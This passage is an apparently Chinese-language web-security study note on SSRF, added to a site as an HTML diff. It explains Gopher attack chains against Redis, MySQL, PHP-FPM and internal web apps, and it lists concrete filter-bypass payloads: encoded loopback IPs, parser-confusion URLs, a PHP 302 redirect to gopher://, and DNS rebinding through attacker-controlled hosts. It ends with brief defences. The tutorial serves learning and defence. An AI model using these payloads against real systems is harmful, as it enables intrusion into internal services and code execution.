+<p><strong>攻击链路</strong>：</p>
+<ol>
+<li><p>获取原始请求报文：利用 Burp Suite 拦截本地发往目标的请求，或使用 <code>nc</code>（Netcat）监听本地端口模拟请求，抓取原始数据流。</p>
+</li>
+<li><p>构造 Payload：</p>
+<ul>
+<li><p>修改 Body（想执行的行为）；</p>
+</li>
+<li><p>重算长度（<code>Content-Length</code>）；</p>
+</li>
+<li><p>URL 编码（把换行变成 <code>%0d%0a</code>，空格变成 <code>%20</code>）；</p>
+</li>
+<li><p>拼装（前缀加上 <code>gopher://127.0.0.1:80/_</code>）</p>
+</li>
+</ul>
+</li>
+<li><p>攻击：将生成的 Payload 注入到 SSRF 漏洞点，受害者服务器通过内网向 <code>127.0.0.1:80</code> 发送伪造的 POST 报文，触发漏洞。</p>
+</li>
+</ol>
+<hr>
+<h4 id="s12">小结<a class="h-link" href="#s12" aria-hidden="true">§</a></h4>
+<p>以上SSRF 跨协议攻击内网服务的场景中，核心利用逻辑均是通过 SSRF 漏洞，控制目标服务器向内部网络发送伪造的协议数据包（以 Gopher 协议为载体），突破网络边界隔离。</p>
+<table>
+<thead>
+<tr>
+<th>攻击目标</th>
+<th>应用层协议特征</th>
+<th>核心前置条件（实战门槛）</th>
+<th>数据包构造方式</th>
+<th>最终利用效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Redis</strong></td>
+<td>RESP（纯文本）</td>
+<td>存在未授权访问（空口令）</td>
+<td><strong>低</strong>：可直接拼接文本指令</td>
+<td>写入计划任务/WebShell（RCE）</td>
+</tr>
+<tr>
+<td><strong>MySQL</strong></td>
+<td>MySQL 协议（二进制）</td>
+<td><strong>必须</strong>为空口令（单次盲发无法处理认证挑战）</td>
+<td><strong>极高</strong>：需抓包提取完整通信流</td>
+<td>数据窃取 / 写入 WebShell</td>
+</tr>
+<tr>
+<td><strong>PHP-FPM</strong></td>
+<td>FastCGI（二进制）</td>
+<td>必须获取一个真实存在的 <code>.php</code> 文件绝对路径</td>
+<td><strong>极高</strong>：依赖自动化工具生成</td>
+<td>篡改运行时配置，直接执行代码（RCE）</td>
+</tr>
+<tr>
+<td><strong>脆弱 Web</strong></td>
+<td>HTTP(S)（文本）</td>
+<td>内部系统存在接收 POST 的特定业务漏洞</td>
+<td><strong>中等</strong>：抓包获取原始报文并重算长度</td>
+<td>触发业务漏洞、越权操作、命令执行</td>
+</tr>
+</tbody></table>
+<p>前三者属于<strong>攻击底层基础服务设施</strong>（Redis缓存、MySQL数据存储、PHP-FPM代码解析）。通过 SSRF 向这些服务发送伪造数据包，利用其配置缺陷（如无鉴权、动态改配置），实现写入恶意文件（Redis/MySQL）或执行任意代码（PHP-FPM），最终目的是<strong>获取服务器最高控制权，彻底接管该机器（RCE）</strong>。这类攻击严重依赖底层协议（二进制）的抓包与伪造，且极受目标安全配置（如空口令、绝对路径）的限制。</p>
+<p>攻击内网中的脆弱Web应用属于攻击业务应用系统，它的目标是运行在基础服务之上的具体业务系统（如内部 OA、Jenkins、管理后台）。通过 SSRF 伪造完整的 HTTP POST 请求（或带特定 Header），绕过内外网边界，<strong>直接触发内网系统的特定业务漏洞（如越权、命令执行接口），获取或操作业务数据</strong>。这种攻击不一定能拿下服务器的底层系统权限（RCE），但能借此访问到原本无法访问的内部数据，或者执行特定的业务动作。</p>
+<hr>
+<h2 id="s13">四、SSRF的绕过<a class="h-link" href="#s13" aria-hidden="true">§</a></h2>
+<h3 id="s14">1. 针对 IP 格式拦截的绕过（字符串层）<a class="h-link" href="#s14" aria-hidden="true">§</a></h3>
+<p><strong>防守逻辑</strong>：对的是<strong>用户输入中直接出现的内网 IP 地址</strong>（如 <code>127.0.0.1</code>、<code>192.168.1.1</code>）进行字符串匹配或正则拦截。</p>
+<p><strong>绕过思路</strong>：<strong>改变 IP 的书写形式</strong>，只要让服务器（Linux/PHP/curl）还能认出这是 <code>127.0.0.1</code>，但让正则表达式认不出就行了。</p>
+<h4 id="s15">进制转换<a class="h-link" href="#s15" aria-hidden="true">§</a></h4>
+<p>计算机底层是二进制，但在解析 IP 时，其实只认数字。所以可以把 <code>127.0.0.1</code> 算成一个巨大的整数：</p>
+<ul>
+<li><p>十进制：<code>2130706433</code></p>
+</li>
+<li><p>十六进制：<code>0x7F000001</code>（前面加 <code>0x</code>）</p>
+</li>
+<li><p>八进制：<code>017700000001</code>（前面加 <code>0</code>，甚至可以加多个 <code>0</code>，如 <code>00017700000001</code>）</p>
+</li>
+</ul>
+<h4 id="s16">特殊字符替换<a class="h-link" href="#s16" aria-hidden="true">§</a></h4>
+<p>把数字换成长得像数字的特殊 Unicode 字符。比如 <code>127.0.0.1</code> 变成 <code>127.⓪.⓪.①</code>。</p>
+<h4 id="s17">采用回环地址变体<a class="h-link" href="#s17" aria-hidden="true">§</a></h4>
+<ul>
+<li><p><strong>IPv6 形式</strong>：<code>http://[::1]</code> 或 <code>http://[::ffff:127.0.0.1]</code> （注意 URL 中 IPv6 必须带方括号）。</p>
+</li>
+<li><p><strong>localhost 形式</strong>：<code>http://localhost</code></p>
+</li>
+<li><p><strong>整个回环网段</strong>：<code>127.0.0.0/8</code> 都是本机，所以 <code>http://127.255.255.254</code> 也是指向你自己。</p>
+</li>
+<li><p><strong>DNS 变体</strong>：<code>http://0</code>、<code>http://127.1</code>。</p>
+</li>
+</ul>
+<hr>
+<h3 id="s18">2. 针对敏感目标拦截的绕过（域名/链路层）<a class="h-link" href="#s18" aria-hidden="true">§</a></h3>
+<p><strong>防守逻辑</strong>：拦截危险协议（<code>gopher</code>）、拦截内网 IP 字符串、或只允许白名单域名。</p>
+<p><strong>绕过思路</strong>：<strong>不直接暴露恶意目标</strong>，而是利用<strong>合法域名或重定向</strong>作为“跳板”。</p>
+<h4 id="s19">利用公共泛解析服务（xip.io / nip.io / sslip.io）<a class="h-link" href="#s19" aria-hidden="true">§</a></h4>
+<blockquote>
+<p>注：现已被大多数 WAF 拉黑</p>
+</blockquote>
+<p>访问 <code>http://127.0.0.1.xip.io</code>的 DNS 解析结果就是 <code>127.0.0.1</code>。WAF 看这是个外网域名，放行了，结果服务器一解析，打到了内网。</p>
+<h4 id="s20">利用第三方重定向（短链接）<a class="h-link" href="#s20" aria-hidden="true">§</a></h4>
+<blockquote>
+<p>针对只查初始 URL 的防守</p>
+</blockquote>
+<p><strong>短链接</strong>本质是一种<strong>开放重定向服务</strong>。将一个长网址（如 <code>http://127.0.0.1/flag.php</code>）提交给短链接平台（如 <code>dwz.cn</code>、<code>bitly</code>），平台会生成一个极短的链接（如 <code>dwz.cn/xxx</code>）。当有人访问这个短链接时，短链接服务器会返回一个 <strong>HTTP 302 重定向</strong>响应，告诉浏览器/客户端“请去访问原始的长网址”。如果后端代码允许跟随重定向（<code>CURLOPT_FOLLOWLOCATION</code>），就中招了。</p>
+<h4 id="s21">自建 302 重定向<a class="h-link" href="#s21" aria-hidden="true">§</a></h4>
+<p>攻击者<strong>自己完全控制</strong>跳转逻辑。短链接只能跳转到 HTTP/HTTPS 地址，而自写 302 可以跳转到 <strong><code>gopher://</code></strong> 等危险协议，用于突破 WAF 对协议的封锁。（也可以在 302 的 <code>Location</code> 里面放 <code>dict://</code> 甚至 <code>file://</code>）
+攻击者需要一台有<strong>公网 IP</strong> 的服务器（VPS），并在上面搭建一个 Web 服务（如 Apache/Nginx + PHP）。然后在该服务器上创建一个 PHP 文件：
+<code>&lt;?php header(&quot;Location: gopher://192.168.80.2:6379/_...&quot;); ?&gt;</code>
+SSRF 所在的服务器先正常访问攻击者的 <code>http://</code> 服务器，攻击者的服务器返回 302 让它去访问 <code>gopher://</code>，从而绕过协议限制。</p>
+<h4 id="s22">重域名（静态解析欺骗）<a class="h-link" href="#s22" aria-hidden="true">§</a></h4>
+<p>现代 WAF 通常会维护一个庞大的黑名单库，不仅拦截内网 IP，还会直接拉黑 <code>xip.io</code>、<code>nip.io</code> 等已知的公共泛解析服务。此外，有些业务代码写死了严格的<strong>域名白名单</strong>（比如只允许访问 <code>*.trusted-cdn.com</code>）。</p>
+<ul>
+<li><p><strong>绕过思路（域名欺骗）</strong>：攻击者利用自定义域名进行静态解析欺骗。具体操作是：注册一个看起来毫无威胁的合法外网域名（例如伪装成图片 CDN 的 <code>img.cdn-static.com</code>），在 DNS 管理后台添加一条 A 记录，将其强行指向内网 IP（如 <code>127.0.0.1</code>）。</p>
+</li>
+<li><p><strong>生效过程</strong>：当攻击者向存在 SSRF 的服务器传入 <code>?url=http://img.cdn-static.com:6379</code> 时，WAF 检查字符串，发现这是一个合法且看似正常的域名（或者是白名单内的域名），直接<strong>放行</strong>。随后服务器底层请求 DNS 服务器，解析出真实 IP 为 <code>127.0.0.1</code>，从而成功触达内网目标。</p>
+</li>
+<li><p><strong>实战</strong>：在高级红队行动中，攻击者有时会通过“子域名接管”漏洞，直接控制某合法企业的一个废弃子域名，利用目标企业自身的信誉来绕过其内部防护设备。</p>
+</li>
+</ul>
+<hr>
+<h3 id="s23">3. 针对组件解析差异的绕过（代码逻辑层）<a class="h-link" href="#s23" aria-hidden="true">§</a></h3>
+<blockquote>
+<p>这种还是挺常见的，因为 WAF 和业务代码往往不是同一家公司写的，只要框架版本有差异，这种漏洞永远杀不绝。</p>
+</blockquote>
+<p>利用了不同代码组件（比如 PHP 自带的解析函数 和 curl 库）在解析同一个 URL 时的<strong>标准不一致</strong>。
+<strong>代码逻辑</strong>：</p>
+<ol>
+<li><p>用 <code>parse_url()</code> 提取出 host，检查是不是内网。</p>
+</li>
+<li><p>如果没问题，就把整个 URL 塞给 <code>curl_exec()</code> 去执行。</p>
+</li>
+</ol>
+<p><strong>攻击者构造的 Payload</strong>：<code>http://a@127.0.0.1:80@baidu.com</code></p>
+<ul>
+<li><p><code>parse_url()</code> 这个函数看到 URL，认为最后一个 <code>@</code> 后面的是真域名，所以它提取出的 host 是：<strong><code>baidu.com</code></strong>。代码一查，这是外网域名，<strong>安全，放行！</strong></p>
+</li>
+<li><p>但是，<code>curl</code> 这个工具在底层执行时，它认为第一个 <code>@</code> 前面的 <code>a</code> 是用户名，第一个 <code>@</code> 后面的 <code>127.0.0.1:80</code> 是主机，第二个 <code>@</code> 后面的 <code>baidu.com</code> 是路径的一部分。所以它真正请求的是：<strong><code>127.0.0.1:80</code></strong>。</p>
+</li>
+</ul>
+<p><strong>其它</strong>：</p>
+<ul>
+<li><p><strong>利用 # 符号</strong>：<code>http://127.0.0.1#@baidu.com</code>（有些解析器认为 <code>#</code> 后面是锚点，忽略掉，结果检查放行，但 curl 可能会去请求内网）。</p>
+</li>
+<li><p><strong>利用反斜杠</strong>：某些解析器（如 PHP 的某些版本）会把 <code>\</code> 当作 <code>/</code>，但前端正则可能不认。<code>http://127.0.0.1\@baidu.com</code>。</p>
+</li>
+</ul>
+<hr>
+<h3 id="s24">4. 针对“先解析后请求”逻辑的绕过（DNS 重绑定）<a class="h-link" href="#s24" aria-hidden="true">§</a></h3>
+<p>很多高级的 WAF 或安全代码，不会傻傻地去正则匹配字符串。它们用的是 <strong>“先解析，后请求”</strong> 的逻辑：</p>
+<ol>
+<li><p>提取 URL 里的域名（如 <code>http://evil.com</code>）。</p>
+</li>
+<li><p>进行第一次 DNS 解析，拿到 IP。</p>
+</li>
+<li><p>检查这个 IP 是不是内网（如 <code>127.0.0.1</code>）。</p>
+</li>
+<li><p>如果检查发现是公网 IP（安全），放行。</p>
+</li>
+<li><p>把 URL 交给 <code>curl</code>，让 <code>curl</code> 去请求。</p>
+</li>
+</ol>
+<p><strong><code>curl</code> 在请求时，会根据域名再次进行 DNS 解析（第二次解析）。由于网络缓存机制或攻击者的操控，这两次解析的 IP 可能是不一样的！</strong></p>
+<p><strong>攻击原理（TOCTOU 时间差攻击）</strong>：</p>
+<p><strong>TTL=0</strong>：黑客在自己的 DNS 解析中，把 TTL（生存时间）设为 0。这意味着受害者服务器<strong>不能缓存</strong>这个解析结果，每次用都必须重新问黑客。</p>
+<ol>
+<li><p>黑客搭建一个自己的 DNS 服务器，准备一个域名 <code>evil.com</code>并将其 <strong>NS 记录</strong>指向自己控制的 DNS 服务器，然后在该 DNS 服务器上编写程序（或使用工具）。</p>
+</li>
+<li><p>受害者服务器发起第一次 DNS 查询：黑客的 DNS 服务器返回 <code>8.8.8.8</code>。</p>
+</li>
+<li><p>受害者代码一看 <code>8.8.8.8</code>，放行！</p>
+</li>
+<li><p>紧接着，底层代码（如 <code>curl</code>）发起第二次 DNS 查询准备真实发包：黑客的 DNS 服务器返回 <code>127.0.0.1</code>。</p>
+</li>
+<li><p>于是，受害者的 <code>curl</code> 去请求了 <code>127.0.0.1</code>，攻击达成。</p>
+</li>
+</ol>
+<blockquote>
+<ul>
+<li><p><strong>重域名（静态欺骗）</strong>：域名与内网 IP 是<strong>固定绑定</strong>的。它主要针对<strong>“只看字符串和域名的黑名单/白名单”</strong>。技术门槛低，买域名改 A 记录即可。</p>
+</li>
+<li><p><strong>DNS 重绑定（动态欺骗）</strong>：域名在公网 IP 与内网 IP 之间<strong>反复横跳</strong>。它主要针对<strong>“先解析域名、后校验 IP”的高级代码逻辑</strong>。技术门槛高，必须自建 DNS 服务器并设置 <code>TTL=0</code>，利用两次解析的时间差（TOCTOU）绕过检查。</p>
+</li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="s25">5. 针对网络架构的绕过（外网访问绕过）<a class="h-link" href="#s25" aria-hidden="true">§</a></h3>
+<ul>
+<li><p><strong>防守逻辑</strong>：内网 WAF 或代码严格拦截 <code>127.0.0.1</code> 及所有变体，完全封死回环访问。</p>
+</li>
+<li><p><strong>绕过原理（利用 NAT 环回）</strong>：
+绝大多数云服务器（如阿里云、腾讯云、AWS）的公网 IP 并非直接绑定在网卡上，而是通过云网关进行 NAT（网络地址转换）映射。当服务器内部向<strong>自身的公网 IP</strong> 发起请求时，流量会出网卡到达云网关，网关识别到该目标为自身，随后将流量原路折返（Hairpin NAT）。因此，<strong>服务器访问自身的公网 IP，在逻辑上等同于访问本机</strong>。</p>
+</li>
+<li><p><strong>操作步骤</strong>：</p>
+<ol>
+<li><p><strong>探测公网 IP</strong>：利用 SSRF 漏洞，让目标服务器请求攻击者控制的公网 VPS 或 DNSLog 域名（如 <code>?url=http://attacker.com</code>）。在 VPS 的访问日志或 DNSLog 记录中，提取目标服务器请求时的<strong>真实源 IP</strong>。</p>
+</li>
+<li><p><strong>替换攻击目标</strong>：将原本被拦截的 <code>127.0.0.1</code> 替换为刚刚获取到的目标服务器公网 IP。</p>
+</li>
+<li><p><strong>发起攻击</strong>：构造请求 <code>?url=http://目标公网IP:6379</code>，目标服务器发起请求后，流量经过云网关环回，成功触达本机内网服务。</p>
+</li>
+</ol>
+</li>
+</ul>
+<p>该手法的成功率取决于目标环境的网络架构。部分企业硬件防火墙或云厂商的安全组策略默认禁用 <strong>NAT 环回（Hairpin NAT）</strong>，此时从内部访问自身公网 IP 会导致连接超时。实战中需通过响应时间或报错信息判断是否打通。</p>
+<hr>
+<h2 id="s26">五、SSRF的防御手法<a class="h-link" href="#s26" aria-hidden="true">§</a></h2>
+<ul>
+<li><p>过滤返回信息，判断返回信息是否带有敏感信息。（一般防不住注入命令）</p>
+</li>
+<li><p>禁用协议，在服务项目比较单一的服务里面只允许使用 <code>HTTP</code> 协议或者 <code>HTTPS</code> 协议，禁止其他的所有协议的使用。（比较有效，但是局限性高）</p>
+</li>
+<li><p>设置 URL 白名单或者限制可访问的内网 IP。</p>
+</li>
+<li><p>加入详细的日志系统，剩下的活让护网的去干</p>
+</li>
+</ul>
+</div>
+
+    <aside class="margin">
+      <div class="margin-sticky">
+        <p class="rail-h mono">READ</p>
+        <p class="margin-pct mono" id="readPct">000<span>%</span></p>
+        <img class="margin-mo" src="img/mo-02.webp" alt="" aria-hidden="true">
+        <div class="rail-more rail-more--right">
+          <p class="rail-h mono">ALL ARTICLES</p>
+          <ul class="rail-list"><li class="is-now"><a href="post.html"><i>▸</i>SSRF从0到1</a></li><li><a href="post-http.html" data-hover><i>·</i>HTTP 基础</a></li><li><a href="post-php.html" data-hover><i>·</i>PHP语言基础</a></li></ul>
+        </div>
+      </div>
+    </aside>
+
+  </div>
+</article>
+
+<footer class="foot">
+  <div class="foot-inner">
+    <a class="foot-back" href="notes.html" data-hover><span>←</span> 全部文章</a>
+
+    <div class="foot-nav">
+      <a class="foot-link" href="post-php.html" data-hover>
+        <span class="mono">PREV</span>
+        <b>PHP语言基础</b>
+      </a>
+      <a class="foot-link foot-link--next" href="post-http.html" data-hover>
+        <span class="mono">NEXT</span>
+        <b>HTTP 基础</b>
+      </a>
+    </div>
+
+    <div class="foot-mo" aria-hidden="true">
+      <img src="img/mo-03.webp" alt="">
+      <img src="img/mo-05.webp" alt="">
+      <img src="img/mo-12.webp" alt="">
+    </div>
+
+    <p class="foot-copy">MAPLE (G7) · WEB SECURITY NOTES</p>
+  </div>
+</footer>
+
+<script src="app.js?v=v14"></script>
+</body>
+</html>
